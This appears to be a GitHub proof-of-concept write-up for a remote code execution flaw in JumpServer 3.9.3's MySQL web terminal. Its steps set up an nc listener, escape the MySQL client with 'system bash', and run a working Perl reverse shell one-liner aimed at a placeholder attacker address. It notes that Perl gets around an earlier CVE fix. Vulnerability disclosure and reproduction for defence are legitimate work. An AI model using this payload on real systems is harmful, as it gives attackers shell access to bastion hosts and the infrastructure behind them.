# JumpServer - MySQL RCE
JumpServer is the world's first open-source Bastion Host and is licensed under the GPLv3. It is a 4A-compliant professional operation and maintenance security audit system. JumpServer uses Python / Django for development, follows Web 2.0 specifications, and is equipped with an industry-leading Web Terminal solution that provides a beautiful user interface and great user experience 
This is a public available vulnerability for Remote Code Execution when using MYSQL conenction in JumpServer 

## Environment
* Platform: Docker
* Operation System: Ubuntu 22.04
* Image Version: JumpServer Image 3.9.3  
* MYSQL Version: 8.0.1

## Step to Reproduce
Step 1. Set up a MYSQL connection inside the JumpServer Web Console  

Step 2. Setup a reverse shell listener in another server ```nc -nlvp 4242```

Step 3. Establish the connection for MySQL inside Jumpserver Web Console

Step 4. Run ```system bash``` and then it will exit the Mysql terminal 

Step 5. Run ```"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP Address>:<Port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' " ``` for connecting reverse shell  
<img width="721" alt="image" src="https://github.com/N0th1n3/JumpServer-MySQLRCE/assets/150101148/60fc4f40-c50f-4ed1-8cf0-46c890cd9fa5">  
Note: (The reason of using perl reverse shell is that the previous fix in CVE-2023-43651 https://github.com/jumpserver/jumpserver/security/advisories/GHSA-4r5x-x283-wm96 has limited most of the reverse shell function).

Step 6. Reverse Shell received  
<img width="520" alt="image" src="https://github.com/N0th1n3/JumpServer-MySQLRCE/assets/150101148/9bdd4383-6d41-42f6-a620-ac77df960452">


